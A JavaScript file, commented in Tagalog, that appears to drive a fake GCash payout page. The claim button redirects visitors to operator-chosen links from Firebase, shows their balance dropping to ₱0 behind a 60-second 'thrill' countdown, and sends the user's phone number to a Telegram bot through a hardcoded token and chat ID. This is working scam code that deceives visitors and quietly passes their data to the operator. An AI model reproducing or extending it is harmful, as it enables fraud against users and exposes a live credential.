/**
 * C.I.A. Logic Remastered
 * Action: Redirect + Thrill Timer + Firewall Check
 */

let isTimerRunning = false;

// 1. Main Function na nakakabit sa "CLAIM THRU GCASH" button
function handleGcashClaim() {
    // Proteksyon: Wag patakbuhin kung kasalukuyang may countdown
    if (isTimerRunning) return;

    const gcashBtn = document.getElementById('claimGCashBtn');
    const balanceDisplay = document.getElementById('userBalanceDisplay');
    const userPhone = localStorage.getItem("userPhone") || "Unknown";

    // STEP 1: Check Firewall Status muna sa Firebase
    // Path: admin/globalFirewall/active
    db.ref('admin/globalFirewall/active').once('value').then(snap => {
        const isFirewallOn = snap.val();

        if (isFirewallOn === true) {
            // FIREWALL IS ON -> Tawagin ang Remastered Verification Popup
            showFirewallVerificationPopup();
        } else {
            // STEP 2: FIREWALL IS OFF -> Kunin ang Link sa "links" node
            // Hahanap ng link na ang status ay 'available'
            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(linkSnap => {
                if (linkSnap.exists()) {
                    const key = Object.keys(linkSnap.val())[0];
                    const targetUrl = linkSnap.val()[key].url;

                    // A. REDIRECT AGAD (No delay para iwas block sa mobile)
                    window.location.href = targetUrl;

                    // B. SIMULAN ANG THRILL TIMER & BALANCE DEDUCTION
                    startTheThrill(gcashBtn, balanceDisplay);
                    
                    // (Optional) I-log sa Telegram na may nag-click ng link
                    sendTelegramLog(`🚀 REDIRECT SUCCESS: User ${userPhone} is now opening the link.`);
                } else {
                    // Walang dineploy na link ang Admin
                    alert("⚠️ SYSTEM BUSY: Payout channels are full. Please wait for the next update.");
                }
            });
        }
    }).catch(err => {
        console.error("Firebase Connection Error:", err);
        alert("⚠️ CONNECTION ERROR: Check your internet and try again.");
    });
}

// 2. Thrill Timer Function
function startTheThrill(btn, display) {
    isTimerRunning = true;
    const originalText = btn.innerHTML; // Itabi ang original image icon
    const originalVal = display.innerText; // Itabi ang original balance (e.g. ₱150)
    
    // Visual: Gawing 0 ang pera para sa "thrill"
    display.innerText = "₱0";
    display.style.color = "#ff3131"; // Gawing pula ang 0

    let timeLeft = 60; // 1 Minute Countdown
    const countdown = setInterval(() => {
        timeLeft--;
        
        // Update Button UI
        btn.innerHTML = `<span class="timer-active ${timeLeft <= 10 ? 'timer-low' : ''}">RECLAIM IN: ${timeLeft}s</span>`;

        if (timeLeft <= 0) {
            clearInterval(countdown);
            // Ibalik ang pera at button sa dati
            display.innerText = originalVal;
            display.style.color = "#39ff14"; // Balik sa green
            btn.innerHTML = originalText;
            isTimerRunning = false;
        }
    }, 1000);
}

// 3. Telegram Logger (Utility)
function sendTelegramLog(msg) {
    const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
    const chatId = "7298607329";
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
    .catch(e => console.log("Telegram log failed."));
}
